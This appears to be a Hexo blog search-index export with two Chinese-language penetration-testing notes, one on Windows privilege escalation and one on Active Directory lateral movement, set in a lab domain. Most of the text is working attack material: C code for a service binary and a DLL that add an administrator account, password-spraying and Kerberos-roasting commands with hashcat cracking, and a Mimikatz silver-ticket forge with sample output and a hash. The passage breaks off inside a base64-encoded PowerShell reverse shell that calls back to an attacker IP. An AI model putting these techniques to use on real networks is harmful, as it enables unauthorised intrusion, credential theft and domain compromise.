<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Windows Privilege Escalation</title>
      <link href="/2024/06/07/Windows-Privilege-Escalation/"/>
      <url>/2024/06/07/Windows-Privilege-Escalation/</url>
      
        <content type="html"><![CDATA[<h2 id="手动信息收集"><a href="#手动信息收集" class="headerlink" title="手动信息收集"></a>手动信息收集</h2><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># 查看当前用户属于哪个组</span><br><span class="line">whoami /groups</span><br><span class="line"></span><br><span class="line"># 获取本地用户</span><br><span class="line">Get-LocalUser</span><br><span class="line"></span><br><span class="line"># 获取本地组</span><br><span class="line">Get-LocalGroup</span><br><span class="line"></span><br><span class="line"># 获取指定组内的成员</span><br><span class="line">Get-LocalGroupMember adminteam</span><br><span class="line"></span><br><span class="line"># 获取主机开放的端口连接</span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line"># 查看已经安装的应用程序</span><br><span class="line">Get-ItemProperty &quot;HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&quot; | select displayname</span><br><span class="line"></span><br><span class="line"># 查看进程信息</span><br><span class="line">Get-Process</span><br><span class="line"></span><br><span class="line"># 搜索所有的密码数据库文件</span><br><span class="line">Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue</span><br><span class="line"></span><br><span class="line"># 搜索配置文件</span><br><span class="line">Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue</span><br><span class="line">Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue</span><br><span class="line"></span><br><span class="line"># 查看当前用户属于哪个组</span><br><span class="line">net user username</span><br><span class="line"></span><br><span class="line"># 以其他用户权限启动cmd</span><br><span class="line">runas /user:backupadmin cmd</span><br></pre></td></tr></table></figure><h3 id="检索历史记录"><a href="#检索历史记录" class="headerlink" title="检索历史记录"></a>检索历史记录</h3><p>主要是Script Block Logging or PowerShell Transcription</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 检查历史命令</span><br><span class="line">Get-History</span><br><span class="line"></span><br><span class="line"># 如果上面的返回空，下面的命令更好，会返回一个文件路径，然后将下面返回的文件路径type出来</span><br><span class="line">(Get-PSReadlineOption).HistorySavePath</span><br><span class="line">如果返回了凭据信息，可以在kali上连接</span><br><span class="line">evil-winrm -i 192.168.50.220 -u daveadmin -p &quot;qwertqwertqwert123\!\!&quot;</span><br></pre></td></tr></table></figure><h2 id="自动化信息收集"><a href="#自动化信息收集" class="headerlink" title="自动化信息收集"></a>自动化信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\winPEAS.exe</span><br></pre></td></tr></table></figure><h2 id="利用Windows服务进行提权"><a href="#利用Windows服务进行提权" class="headerlink" title="利用Windows服务进行提权"></a>利用Windows服务进行提权</h2><p>主要包括劫持服务二进制文件、劫持服务 DLL、滥用未加引号的服务路径</p><h3 id="服务二进制文件劫持"><a href="#服务二进制文件劫持" class="headerlink" title="服务二进制文件劫持"></a>服务二进制文件劫持</h3><p>每个 Windows 服务都有一个关联的二进制文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 如果下面的命令在winrm或者bind shell中运行失败，可能使用rdp登录可以解决这种问题</span><br><span class="line">Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object &#123;$_.State -like &#x27;Running&#x27;&#125;</span><br><span class="line"></span><br><span class="line"># 获取服务的权限设置</span><br><span class="line">icacls &quot;C:\xampp\apache\bin\httpd.exe&quot;</span><br><span class="line">C:\xampp\apache\bin\httpd .exe BUILTIN\Administrators:(F)</span><br><span class="line">NT AUTHORITY\SYSTEM:(F)</span><br><span class="line">BUILTIN\Users:(RX)</span><br><span class="line">NT AUTHORITY\Authenticated Users:(RX) </span><br><span class="line"># 权限表如下</span><br></pre></td></tr></table></figure><table><thead><tr><th>Mask</th><th>Permissions</th></tr></thead><tbody><tr><td>F</td><td>Full access</td></tr><tr><td>M</td><td>Modify access</td></tr><tr><td>RX</td><td>Read and execute access</td></tr><tr><td>R</td><td>Read-only access</td></tr><tr><td>W</td><td>Write-only access</td></tr></tbody></table><p>创建adduser.c文件并在kali上交叉编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib .h&gt;</span><br><span class="line">int main ()</span><br><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">i = system (&quot;net user dave2 password123! /add&quot;);</span><br><span class="line">i = system (&quot;net localgroup administrators dave2 /add&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Kali交叉编译</span><br><span class="line">x86_64-w64-mingw32-gcc adduser.c -o adduser.exe</span><br><span class="line"></span><br><span class="line">将adduser.exe放到目标机器上替换mysqld.exe</span><br><span class="line"></span><br><span class="line"># 尝试重启mysql服务，一般会报错，普通用户没有重启系统服务的权限</span><br><span class="line">net stop mysql</span><br><span class="line"># 检查mysql服务的启动类型</span><br><span class="line">Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object &#123;$_.Name -like &#x27;mysql&#x27;&#125;</span><br><span class="line"></span><br><span class="line"># 检查当前用户的权限</span><br><span class="line">whoami /priv</span><br></pre></td></tr></table></figure><p>或者使用PowerUp.ps1脚本检查是否存在脆弱的服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell -ep bypass</span><br><span class="line">..\PowerUp.ps1</span><br><span class="line">Get-ModifiableServiceFile</span><br></pre></td></tr></table></figure><h3 id="服务dll文件劫持"><a href="#服务dll文件劫持" class="headerlink" title="服务dll文件劫持"></a>服务dll文件劫持</h3><p>Windows检索dll文件的顺序</p><table><thead><tr><th>序号</th><th>目录</th></tr></thead><tbody><tr><td>1.</td><td>directory from which the application loaded .</td></tr><tr><td>2.</td><td>system directory .</td></tr><tr><td>3.</td><td>16-bit system directory .</td></tr><tr><td>4.</td><td>Windows directory .</td></tr><tr><td>5.</td><td>current directory .</td></tr><tr><td>6.</td><td>directories that are listed in the PATH environment variable .</td></tr></tbody></table><p>需要管理权限才能启动Process Monitor并收集程序加载的dll</p><p>如果没找到，可能是服务问题，此时尝试重启服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Restart-Service BetaService</span><br></pre></td></tr></table></figure><p>如果找到了服务未加载成功或者缺失或者可以替换的dll，则替换为恶意dll</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib .h&gt;</span><br><span class="line">#include &lt;windows .h&gt;</span><br><span class="line">BOOL APIENTRY DllMain(</span><br><span class="line">HANDLE hModule,// Handle to DLL module</span><br><span class="line">DWORD ul_reason_for_call,// Reason for calling function</span><br><span class="line">LPVOID lpReserved ) // Reserved</span><br><span class="line">&#123;</span><br><span class="line">switch ( ul_reason_for_call )</span><br><span class="line">&#123;</span><br><span class="line">        case DLL_PROCESS_ATTACH: // A process is loading the DLL .</span><br><span class="line">        int i;</span><br><span class="line">        i = system (&quot;net user dave2 password123! /add&quot;);</span><br><span class="line">        i = system (&quot;net localgroup administrators dave2 /add&quot;);</span><br><span class="line">        break;</span><br><span class="line">        case DLL_THREAD_ATTACH: // A process is creating a new thread .</span><br><span class="line">        break;</span><br><span class="line">        case DLL_THREAD_DETACH: // A thread exits normally .</span><br><span class="line">        break;</span><br><span class="line">        case DLL_PROCESS_DETACH: // A process unloads the DLL .</span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br><span class="line">return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 编译</span><br><span class="line">x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll</span><br></pre></td></tr></table></figure><p>然后重启服务</p><h3 id="可执行文件路径存在空格但是没有用引号"><a href="#可执行文件路径存在空格但是没有用引号" class="headerlink" title="可执行文件路径存在空格但是没有用引号"></a>可执行文件路径存在空格但是没有用引号</h3><p>文件的路径包含一个或多个空格且未括在引号内</p><p>例如C:\Program Files\My Program\My service\service.exe，当Windows启动服务时，由于路径中有空格，它将使用以下顺序尝试启动可执行文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Program .exe</span><br><span class="line">C:\Program Files\My .exe</span><br><span class="line">C:\Program Files\My Program\My .exe</span><br><span class="line">C:\Program Files\My Program\My service\service .exe</span><br></pre></td></tr></table></figure><p>可以将可执行文件命名为Program.exe并将其放置在C:\盘</p><p>或者命名为My.exe，然后将其放置到C:\Program Files中</p><p>或者My.exe 然后将其放置到 C:\Program Files\My Program\</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,pathname |  findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;</span><br><span class="line">Get-CimInstance -ClassName win32_service | Select Name,State,PathName</span><br></pre></td></tr></table></figure><p>先检查是否有权限启动和停止服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Start-Service GammaService</span><br><span class="line">Stop-Service GammaService</span><br></pre></td></tr></table></figure><p>检查权限是否可写（返回W）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls &quot;C:\&quot;</span><br></pre></td></tr></table></figure><p>以如下为例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe</span><br></pre></td></tr></table></figure><p>将shell命名为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Current.exe</span><br><span class="line">放到C:\Program Files\Enterprise Apps\</span><br></pre></td></tr></table></figure><p>有时候启动服务会报错，但是不影响shell执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Start-Service GammaService</span><br></pre></td></tr></table></figure><p>有时候PowerUp.ps1可以识别出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">powershell -ep bypass</span><br><span class="line">. .\PowerUp.ps1</span><br><span class="line">Get-UnquotedService</span><br><span class="line">Write-ServiceBinary -Name &#x27;GammaService&#x27; -Path &quot;C:\Program Files\Enterprise Apps\Current.exe&quot;</span><br><span class="line">Restart-Service GammaService</span><br></pre></td></tr></table></figure><h2 id="其他错误配置导致的提权"><a href="#其他错误配置导致的提权" class="headerlink" title="其他错误配置导致的提权"></a>其他错误配置导致的提权</h2><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 查看计划任务</span><br><span class="line">schtasks /query /fo LIST /v</span><br><span class="line"></span><br><span class="line"># 检查权限</span><br><span class="line">icacls &quot;xxxx.exe&quot;</span><br></pre></td></tr></table></figure><h3 id="Potato"><a href="#Potato" class="headerlink" title="Potato"></a>Potato</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SeImpersonatePrivilege权限</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AD Lateral Movement</title>
      <link href="/2024/06/05/AD-Lateral-Movement/"/>
      <url>/2024/06/05/AD-Lateral-Movement/</url>
      
        <content type="html"><![CDATA[<h2 id="使用Windows自带命令进行信息收集"><a href="#使用Windows自带命令进行信息收集" class="headerlink" title="使用Windows自带命令进行信息收集"></a>使用Windows自带命令进行信息收集</h2><p>查询域内的用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure><p>查询某个用户在域内的所属用户组和权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user jeffadmin /domain</span><br></pre></td></tr></table></figure><p>查询域内的所有组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group /domain</span><br></pre></td></tr></table></figure><p>查询域内某个组的所有成员</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Sales Department&quot; /domain</span><br></pre></td></tr></table></figure><h2 id="使用PowerShell脚本进行信息收集"><a href="#使用PowerShell脚本进行信息收集" class="headerlink" title="使用PowerShell脚本进行信息收集"></a>使用PowerShell脚本进行信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line">Get-NetDomain</span><br><span class="line">Get-NetUser</span><br><span class="line">Get-NetUser | select cn</span><br><span class="line">Get-NetUser | select cn,pwdlastset,lastlogon</span><br><span class="line">Get-NetGroup | select cn</span><br><span class="line">Get-NetGroup &quot;Sales Department&quot; | select member</span><br><span class="line">Get-NetComputer</span><br><span class="line">Get-NetComputer | select operatingsystem,dnshostname</span><br><span class="line"></span><br><span class="line"># 查找域内共享</span><br><span class="line">Find-DomainShare</span><br><span class="line"></span><br><span class="line"># 访问域内共享</span><br><span class="line">ls \\dc1.corp.com\sysvol\corp.com\</span><br><span class="line"></span><br><span class="line"># 返回当前域用户可能在哪台机器上有管理员权限</span><br><span class="line">Find-LocalAdminAccess</span><br><span class="line"></span><br><span class="line"># 查找指定机器上有哪些用户登录</span><br><span class="line">Get-NetSession -ComputerName 主机名</span><br><span class="line"></span><br><span class="line"># 查询域内主机名和操作系统信息</span><br><span class="line">Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion</span><br><span class="line"></span><br><span class="line"># 返回在client74机器上的可能会话，如果当前用户有权限登录client74，就有可能能够拿到该机器上其他用户的凭据</span><br><span class="line">.\PsLoggedon.exe \\client74</span><br></pre></td></tr></table></figure><h2 id="自动化域内信息收集"><a href="#自动化域内信息收集" class="headerlink" title="自动化域内信息收集"></a>自动化域内信息收集</h2><p>使用SharpHound </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Sharphound.ps1</span><br><span class="line"># 收集域内所有信息，收集完毕之后会在目标目录下生成一个.zip文件</span><br><span class="line">Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public -OutputPrefix &quot;corp audit&quot;</span><br><span class="line"></span><br><span class="line"># 在Kali上使用BloodHound分析域环境</span><br><span class="line"># Kali运行</span><br><span class="line">sudo neo4j start</span><br><span class="line"># 服务启动后在新终端运行</span><br><span class="line">bloodhound</span><br></pre></td></tr></table></figure><h2 id="凭据攻击"><a href="#凭据攻击" class="headerlink" title="凭据攻击"></a>凭据攻击</h2><p>主要解决了拿到域内用户凭据之后怎么做</p><h3 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h3><p>第一是密码喷洒，直接明文攻击，也就是爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 方法一</span><br><span class="line">powershell -ep bypass</span><br><span class="line"></span><br><span class="line"># —Pass指定密码，也可以-File指定字典，脚本会自动识别域内用户并进行攻击，-Admin会自动测试管理员账户</span><br><span class="line">.\Spray-Passwords.ps1 -Pass Nexus123! -Admin</span><br><span class="line"></span><br><span class="line"># 方法二，使用smb协议，这种攻击方式较慢</span><br><span class="line"># -u 和 -p 提供字典或单个字符串。-d 域名，--continue-on-success，避免在第一个有效凭据处停止</span><br><span class="line">crackmapexec smb 192.168.50.75 -u users.txt -p &#x27;Nexus123!&#x27; -d corp.com -- continue-on-success</span><br><span class="line"></span><br><span class="line"># 方法一和方法二的区别在于crackmapexec 在开始密码喷洒之前不会检查域的密码策略，但是crackmapexec会返回成功的用户是否在目标机器上有管理员权限，如下</span><br><span class="line">crackmapexec smb 192.168.50.75 -u dave -p &#x27;Flowers1&#x27; -d corp.com</span><br><span class="line"># 如果上述命令返回Pwn3d!，则代表dave用户在.75机器上有管理员权限</span><br><span class="line"></span><br><span class="line"># 方法三</span><br><span class="line">.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt &quot;Nexus123!&quot;</span><br></pre></td></tr></table></figure><h3 id="获取域用户的口令哈希"><a href="#获取域用户的口令哈希" class="headerlink" title="获取域用户的口令哈希"></a>获取域用户的口令哈希</h3><p>默认情况下，AD 用户帐户选项“不需要 Kerberos 预身份验证”处于禁用状态，这意味着对所有用户执行 Kerberos 预身份验证。但是，可以手动启用此帐户选项，如果该选项被启用，意味着没有 Kerberos 预身份验证，攻击者可以代表任何 AD 用户向域控制器发送 AS-REQ。从域控制器获取 AS-REP 后，攻击者可以对响应的加密部分执行离线密码攻击。这种攻击称为 AS-REP Roasting，可以拿到hash。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 方法一</span><br><span class="line"></span><br><span class="line"># -dc-ip指定dc的IP，-outputfile指定输出文件，corp.com/pete指定域用户</span><br><span class="line">impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete</span><br><span class="line"></span><br><span class="line"># hashes.asreproast</span><br><span class="line">$krb5asrep$23$dave@CORP.COM:b24a619cfa58...</span><br><span class="line"></span><br><span class="line"># hashcat破解凭据</span><br><span class="line">sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 方法二，使用Rubeus.exe，会自动识别可以拿到hash的用户</span><br><span class="line">.\Rubeus.exe asreproast /nowrap</span><br><span class="line">.\Rubeus.exe kerberoast /outfile:hashes.kerberoast</span><br><span class="line">sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</span><br><span class="line"># 在kali上也可以达到相同的效果，需要指定DC的用户名</span><br><span class="line">sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete</span><br><span class="line"># PS：hashcat破解的时候最好两个mode都试一下</span><br></pre></td></tr></table></figure><h2 id="伪造票据凭证"><a href="#伪造票据凭证" class="headerlink" title="伪造票据凭证"></a>伪造票据凭证</h2><p>如果拿到了服务帐户密码或其关联的 NTLM 哈希，我们可以伪造自己的服务票证，以任何我们想要的权限访问目标资源（下面的示例中为 IIS 应用程序）。此自定义创建的票证称为银票，如果服务主体名称在多台服务器上使用，则可以利用银票来对付所有服务器。</p><p>一般来说，需要收集以下三条信息来创建银票：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SPN 密码哈希</span><br><span class="line">域 SID</span><br><span class="line">目标 SPN</span><br></pre></td></tr></table></figure><p>如下，以Jeff身份登录域内机器，访问iis_service的web服务，被拒绝</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iwr -UseDefaultCredentials http://web04</span><br></pre></td></tr></table></figure><p>第一步，需要拿到iis_service服务账户的NTLM哈希</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>第二步，获取域 SID，可以输入 <code>whoami /user</code> 来获取当前用户的 SID。或者，也可以从 Mimikatz 的输出中检索 SPN 用户帐户的 SID，SID 由几个部分组成，我们只对域 SID 感兴趣。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br><span class="line"># 返回S-1-5-21-1987370270-658905905-1781884369-1105，只需要1105前面的部分</span><br></pre></td></tr></table></figure><p>第三步，获取目标的SPN，这里是web04上的HTTP SPN资源，因为我们想要访问在IIS上运行的网页</p><p>三个要素都收集好了之后，使用 kerberos::golden 模块创建伪造的服务票证，需要提供域 SID (&#x2F;sid:)、域名 (&#x2F;domain:) 和 SPN 运行的目标 (&#x2F;target:)。我们还需要包括 SPN 协议 (&#x2F;service:)、SPN 的 NTLM 哈希 (&#x2F;rc4:) 和 &#x2F;ptt 选项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369</span><br><span class="line">/domain:corp.com /ptt /target:web04.corp.com /service:http</span><br><span class="line">/rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin</span><br><span class="line"></span><br><span class="line"># 返回如下</span><br><span class="line">User       : jeffadmin</span><br><span class="line">Domain     : corp .com (CORP)</span><br><span class="line">SID        : S-1-5-21-1987370270-658905905-1781884369</span><br><span class="line">User Id    : 500</span><br><span class="line">Groups Id : *513 512 520 518 519</span><br><span class="line">ServiceKey: 4d28cf5252d39971419580a51484ca09 - rc4_hmac_nt</span><br><span class="line">Service    : http</span><br><span class="line">Target     : web04.corp.com</span><br><span class="line">Lifetime  : 9/14/2022 4:37:32 AM ; 9/11/2032 4:37:32 AM ; 9/11/2032 4:37:32 AM</span><br><span class="line">-&gt; Ticket : ** Pass The Ticket **</span><br><span class="line">* PAC generated</span><br><span class="line">* PAC signed</span><br><span class="line">* EncTicketPart generated</span><br><span class="line">* EncTicketPart encrypted</span><br><span class="line">* KrbCred generated</span><br><span class="line">Golden ticket for &#x27;jeffadmin @ corp .com&#x27; successfully submitted for current session</span><br></pre></td></tr></table></figure><p>上面运行的结果返回表示SPN HTTP&#x2F;web04.corp.com 的新服务票证已加载到内存中，并且 Mimikatz 在伪造的票证中设置了适当的组成员权限。从 IIS 应用程序的角度来看，当前用户既是内置的本地管理员（User Id：500），又是几个高权限组的成员，域管理员组（Groups Id ID：512），然后就可以正常访问目标服务了。</p><h2 id="拿域内任意用户的凭证"><a href="#拿域内任意用户的凭证" class="headerlink" title="拿域内任意用户的凭证"></a>拿域内任意用户的凭证</h2><p>前提是拿到域管理员组的权限用户之后，鸡肋</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /user:corp\dave</span><br></pre></td></tr></table></figure><p>返回了dave用户的HTLM哈希就能爆破了</p><h2 id="内网横向移动"><a href="#内网横向移动" class="headerlink" title="内网横向移动"></a>内网横向移动</h2><h3 id="使用WMI和WinRM进行横向移动"><a href="#使用WMI和WinRM进行横向移动" class="headerlink" title="使用WMI和WinRM进行横向移动"></a>使用WMI和WinRM进行横向移动</h3><p>为了通过 WMI 在远程目标上创建进程，需要管理员本地组成员的凭据，该成员也可以是域用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create &quot;calc&quot;</span><br></pre></td></tr></table></figure><p>通过WMI执行Power Shell reverse shell</p><p>使用python对shellcode进行base64编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">payload = <span class="string">&#x27;$client = New-Object</span></span><br><span class="line"><span class="string">System.Net.Sockets.TCPClient(&quot;192.168.118.2&quot;,443);$stream =</span></span><br><span class="line"><span class="string">$client .GetStream();[byte[]]$bytes = 0 . .65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName</span></span><br><span class="line"><span class="string">System.Text.ASCIIEncoding) .GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-</span></span><br><span class="line"><span class="string">String );$sendback2 = $sendback + &quot;PS &quot; + (pwd) .Path + &quot;&gt; &quot;;$sendbyte =</span></span><br><span class="line"><span class="string">([text.encoding]::ASCII) 